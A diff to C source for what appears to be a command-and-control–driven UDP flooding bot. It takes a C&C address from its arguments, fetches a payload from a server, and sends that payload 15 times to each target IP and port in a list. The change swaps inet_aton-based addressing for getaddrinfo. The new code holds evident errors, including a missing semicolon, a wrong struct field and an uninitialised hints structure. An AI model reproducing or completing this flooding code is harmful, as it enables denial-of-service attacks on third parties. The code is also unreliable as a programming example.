@@ -76,37 +76,36 @@ void prog(int sockfd, struct msg *message, char *payload)
     char *udp_server_ip = message->entry[0].ip_address;
     char *udp_server_port = message->entry[0].port_number;
 
-    struct sockaddr_in udp_server = { 0 };
-    udp_server.sin_family = AF_INET;
-    udp_server.sin_addr.s_addr = inet_aton(udp_server_ip);
-    udp_server.sin_port = htons(atoi(udp_server_port));
+    struct addrinfo *udp_server;
+    struct addrinfo hints
+    hints.sin_family = AF_INET;
+    hints.ai_socktype = SOCK_DGRAM;
+
+    getaddrinfo(udp_server_ip, udp_server_port, &hints, &udp_server);
 
     sendto(sockfd, data, strlen(data), 0,
-           (const struct sockaddr *) &udp_server,
-           sizeof(udp_server));
+           udp_server->ai_addr, udp_server->ai_addrlen);
 
     recvfrom(sockfd, payload, BUFLEN, 0, NULL, NULL); 
 }
 
 void run(int sockfd, struct msg *message, char *payload)
 {
-    char *target_ip;
-    char *target_port;
-
-    struct sockaddr_in target;
+    struct addrinfo hints;
+    struct addrinfo *res;
     
     for(int i = 0; i < 15; ++i){
         
         for(int j = 0; j < message->number_of_pairs; ++j){
             
-            memset(&target, 0, sizeof(target));
-            target.sin_family = AF_INET;
-            target.sin_addr.s_addr = inet_aton(message->entry[j].ip_address);
-            target.sin_port = htons(atoi(message->entry[j].port_number));
+            memset(&hints, 0, sizeof(hints));
+            hints.ai_family = AF_INET;
+            hints.ai_socktype = SOCK_DGRAM;
+
+            getaddrinfo(message->entry[j].ip_address, message->entry[j].port_number, &hints, &res);
 
             sendto(sockfd, payload, strlen(payload), 0,
-                   (const struct sockaddr *) &target,
-                   sizeof(target));
+                   res->ai_addr, res->ai_addrlen);
         }
     } 
 }
@@ -117,7 +116,7 @@ int main(int argc, char **argv)
 
     char payload[BUFLEN];
     char packet[BUFLEN];
-    struct message message;
+    struct msg message;
 
     char *cnc_ip = argv[1];
     char *cnc_port = argv[2];
